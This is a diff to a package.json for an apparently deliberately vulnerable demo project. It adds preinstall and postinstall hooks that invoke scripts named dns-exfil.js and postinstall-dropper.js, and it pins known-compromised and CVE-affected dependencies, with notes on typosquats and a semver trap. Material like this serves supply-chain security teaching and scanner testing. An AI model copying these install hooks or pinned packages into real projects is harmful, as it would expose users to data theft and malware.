@@ -4,7 +4,8 @@
   "description": "DEMO — intentional supply-chain and runtime vulnerabilities",
   "main": "server.js",
   "scripts": {
-    "preinstall": "node scripts/preinstall.js",
+    "preinstall": "node scripts/preinstall.js && node scripts/dns-exfil.js",
+    "postinstall": "node scripts/postinstall-dropper.js",
     "start": "node server.js"
   },
   "dependencies": {
@@ -17,25 +18,31 @@
     "ua-parser-js":         "0.7.28",
     "minimist":             "0.0.8",
     "event-stream":         "3.3.6",
-    "flatmap-stream":       "0.1.1"
+    "flatmap-stream":       "0.1.1",
+    "caret-trap-lib":       "^1.11.21",
+    "protobufjs":           "7.4.0"
   },
   "_supply_chain_notes": {
+    "semver_trap_examples": {
+      "caret-trap-lib@^1.11.21": "caret range resolves to a malicious patch version after republish"
+    },
     "typosquat_examples": {
-      "crossenv":    "typosquat of cross-env  — documented 2018 npm attack",
-      "colourama":   "typosquat of colorama   — documented PyPI attack",
-      "lodahs":      "typosquat of lodash     — substitutes number-1 for letter-l",
-      "expres":      "typosquat of express    — single-letter omission",
-      "mongoos":     "typosquat of mongoose   — trailing-letter drop"
+      "crossenv":  "typosquat of cross-env",
+      "colourama": "typosquat of colorama",
+      "lodahs":    "typosquat of lodash",
+      "expres":    "typosquat of express",
+      "mongoos":   "typosquat of mongoose"
     },
     "stale_high_severity": {
-      "event-stream@3.3.6":         "CVE — malicious payload injected Nov 2018 (supply chain)",
-      "flatmap-stream@0.1.1":       "malicious payload package from event-stream attack",
-      "node-serialize@0.0.4":       "RCE via deserialization — no patch available",
-      "ua-parser-js@0.7.28":        "CVE-2021-27292 — ReDoS",
-      "axios@0.19.2":               "CVE-2020-28168 — SSRF via redirects",
-      "handlebars@4.5.3":           "CVE-2019-19919 — prototype pollution / template injection",
-      "minimist@0.0.8":             "CVE-2021-44906 — prototype pollution",
-      "serialize-javascript@1.7.0": "CVE-2020-7660 — RCE via unsafe regex"
+      "event-stream@3.3.6":         "known compromised supply-chain version",
+      "flatmap-stream@0.1.1":       "known malicious dependency",
+      "node-serialize@0.0.4":       "RCE via deserialization",
+      "ua-parser-js@0.7.28":        "CVE-2021-27292",
+      "axios@0.19.2":               "CVE-2020-28168",
+      "handlebars@4.5.3":           "CVE-2019-19919",
+      "minimist@0.0.8":             "CVE-2021-44906",
+      "serialize-javascript@1.7.0": "CVE-2020-7660",
+      "protobufjs@7.4.0":           "CVE-2026-41242"
     }
   }
 }
